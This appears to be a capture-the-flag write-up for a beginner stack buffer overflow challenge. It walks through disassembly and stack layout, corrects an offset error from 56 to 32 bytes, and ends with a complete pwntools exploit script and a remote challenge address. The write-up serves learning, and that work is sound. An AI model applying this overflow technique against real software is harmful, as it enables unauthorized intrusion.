## Overflow 101 - pwn

>[Description] Input panjang menimpa variabel lalu flag tercetak.

>## Initial Analysis

We're given a 64-bit ELF binary named `be1`:
```
be1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=0aa4468471696f63aab9f069f2c7529bd639ca0c,
for GNU/Linux 3.2.0, not stripped
```

>### Protections
```c
Arch:       amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

The important takeaway: **no canary + no PIE + a function (`print_flag`) that's never called in the normal program flow.** That's the whole challenge in one sentence, we don't need to fight NX, SHSTK, or IBT at all, because the win condition doesn't require executing injected code or redirecting RIP anywhere.

>### Disassembly

Since the binary isn't stripped, `info functions` in GDB/pwndbg gives us the symbol table directly:

```asm
Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401080  puts@plt
0x0000000000401090  write@plt
0x00000000004010a0  read@plt
0x00000000004010b0  setvbuf@plt
0x00000000004010c0  open@plt
0x00000000004010d0  _start
0x0000000000401100  _dl_relocate_static_pie
0x0000000000401110  deregister_tm_clones
0x0000000000401140  register_tm_clones
0x0000000000401180  __do_global_dtors_aux
0x00000000004011b0  frame_dummy
0x00000000004011b6  print_flag
0x0000000000401228  main
0x00000000004012c8  _fini
```

Two functions actually matter: `print_flag` and `main`. `disassemble main` gives us the full picture:

```asm
Dump of assembler code for function main:
   0x0000000000401228 <+0>:    endbr64
   0x000000000040122c <+4>:    push   rbp
   0x000000000040122d <+5>:    mov    rbp,rsp
   0x0000000000401230 <+8>:    sub    rsp,0x30
   0x0000000000401234 <+12>:   mov    rax,QWORD PTR [rip+0x2e15]        # stdout@GLIBC_2.2.5
   0x000000000040123b <+19>:   mov    ecx,0x0
   0x0000000000401240 <+24>:   mov    edx,0x2
   0x0000000000401245 <+29>:   mov    esi,0x0
   0x000000000040124a <+34>:   mov    rdi,rax
   0x000000000040124d <+37>:   call   0x4010b0 <setvbuf@plt>
   0x0000000000401252 <+42>:   mov    QWORD PTR [rbp-0x10],0x0
   0x000000000040125a <+50>:   lea    rax,[rip+0xdb6]        # 0x402017
   0x0000000000401261 <+57>:   mov    rdi,rax
   0x0000000000401264 <+60>:   call   0x401080 <puts@plt>
   0x0000000000401269 <+65>:   lea    rax,[rip+0xdba]        # 0x40202a
   0x0000000000401270 <+72>:   mov    rdi,rax
   0x0000000000401273 <+75>:   call   0x401080 <puts@plt>
   0x0000000000401278 <+80>:   lea    rax,[rbp-0x30]
   0x000000000040127c <+84>:   mov    edx,0x64
   0x0000000000401281 <+89>:   mov    rsi,rax
   0x0000000000401284 <+92>:   mov    edi,0x0
   0x0000000000401289 <+97>:   call   0x4010a0 <read@plt>
   0x000000000040128e <+102>:  mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401292 <+106>:  cmp    rax,0xc0ffee
   0x0000000000401298 <+112>:  jne    0x4012b0 <main+136>
   0x000000000040129a <+114>:  lea    rax,[rip+0xd9f]        # 0x402040
   0x00000000004012a1 <+121>:  mov    rdi,rax
   0x00000000004012a4 <+124>:  call   0x401080 <puts@plt>
   0x00000000004012a9 <+129>:  call   0x4011b6 <print_flag>
   0x00000000004012ae <+134>:  jmp    0x4012bf <main+151>
   0x00000000004012b0 <+136>:  lea    rax,[rip+0xdad]        # 0x402064
   0x00000000004012b7 <+143>:  mov    rdi,rax
   0x00000000004012ba <+146>:  call   0x401080 <puts@plt>
   0x00000000004012bf <+151>:  mov    eax,0x0
   0x00000000004012c4 <+156>:  leave
   0x00000000004012c5 <+157>:  ret
```

>### Reading the stack frame

`sub rsp, 0x30` reserves 48 (`0x30`) bytes of local stack space below the saved RBP. Two offsets inside that space matter:

- **`[rbp-0x10]`** a local 8-byte variable, explicitly zeroed at `<+42>` (`mov QWORD PTR [rbp-0x10], 0x0`) before anything else happens. This is the "magic value" slot.
- **`[rbp-0x30]`** the start of the input buffer. `lea rax, [rbp-0x30]` loads its address into `rsi` (the buffer pointer argument to `read`).

The `read` call itself:

```asm
lea    rax,[rbp-0x30]   ; rax = &buffer
mov    edx,0x64         ; edx = 0x64 (100) -> 3rd arg: size (bytes to read)
mov    rsi,rax          ; rsi = &buffer    -> 2nd arg: destination buffer
mov    edi,0x0          ; edi = 0          -> 1st arg: fd (stdin)
call   read@plt         ; read(0, buf, 0x64)
```

That's `read(0, buf, 0x64)` **reading up to 100 bytes into a 48-byte stack region.** That's the bug: the buffer at `[rbp-0x30]` is only 0x20 (32) bytes away from `[rbp-0x10]`, but `read` will happily take 100 bytes and keep writing straight past it, overwriting whatever comes next on the stack including `[rbp-0x10]`, then the saved RBP, then the saved return address.

Right after the read, the program re-reads that variable and checks it:

```asm
mov    rax,QWORD PTR [rbp-0x10]
cmp    rax,0xc0ffee
jne    0x4012b0 <main+136>   ; if not equal, print "fail" message
...
call   0x4011b6 <print_flag> ; if equal, print the flag
```

So the win condition is simple: **make `[rbp-0x10] == 0xc0ffee` at the time of the `cmp`.** We don't need to touch the saved RBP or the return address at all, `print_flag` is called by `main` itself through a normal, legitimate `call` instruction once the check passes. There is no RIP hijack happening here; this is a pure data-overwrite bug.

>## Solution

>### Finding the offset (and fixing the writeup's own mistake)

The original approach in this writeup was to throw a **cyclic pattern** at the input, crash the program, and read the offset off a corrupted `$rsp` / return address,  the standard method for finding the offset to **the saved return address**. That gave an offset of **56**.

That number is correct for what it measures, but it's measuring the wrong target. 56 bytes is the distance from the start of the buffer to the **saved RIP** on the stack (`buffer start -> saved RBP -> saved RIP`), not to `[rbp-0x10]`. Since this challenge never needs RIP control, chasing that offset was unnecessary, and using it in the exploit would've landed `0xc0ffee` eight bytes into the return address instead of into the check variable, which wouldn't satisfy the `cmp` at all.

The actual offset doesn't need a cyclic pattern, it's sitting right there in the disassembly:

```
buffer start : [rbp-0x30]
target var   : [rbp-0x10]

offset = (rbp-0x10) - (rbp-0x30) = 0x30 - 0x10 = 0x20 = 32 bytes
```

So the correct payload is:

```
32 bytes of padding  +  p64(0xc0ffee)
```

This is exactly what `offset = 32` in the solver does. It's right, but the writeup's narrative leading up to it (cyclic pattern -> 56) was solving for a different, irrelevant offset. Worth remembering for future challenges: **cyclic pattern + `$rsp` inspection finds the offset to the saved return address specifically.** If the thing you actually need to overwrite is some other local variable sitting between the buffer and the saved RBP, compute that offset directly from the stack frame layout instead. It'll usually be smaller, and a cyclic pattern will actively mislead you if you don't know which distance it's telling you.

>### Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./be1_patched", checksec=False)

# context.terminal = ['kitty', '@', 'launch', '--type=window', '--location=hsplit']
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("51.79.201.156", 7013)

    return r


def main():
    r = conn()

    offset = 32
    payload = b'A' * offset + p64(0xc0ffee)

    r.sendlineafter(b'Enter your name:', payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

![[Pasted image 20261002203235.png]]

>### Flag

```
REDLIMIT{try_1n_y0ur_m4ch1n3}
```
